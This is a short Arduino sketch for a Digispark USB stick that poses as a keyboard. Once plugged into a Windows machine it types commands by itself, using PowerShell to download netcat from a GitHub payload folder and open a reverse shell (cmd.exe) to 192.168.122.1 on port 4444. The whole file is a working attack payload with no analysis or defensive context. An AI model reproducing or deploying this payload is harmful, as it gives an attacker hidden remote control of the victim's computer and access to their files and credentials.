#include <stdlib.h>
#include "DigiKeyboard.h"

void setup() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(1000);  
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(2000);
  DigiKeyboard.print("cmd");
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(3000);
  DigiKeyboard.print("powershell $ip = '192.168.122.1';$port = '4444';Invoke-WebRequest https://github.com/tomiodarim/Digispark/blob/main/payloads/netcat.exe?raw=true -o C:\\Windows\\Temp\\nc.exe;C:\\Windows\\Temp\\nc.exe -e cmd.exe $ip $port -d;exit");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
}

void loop() {}
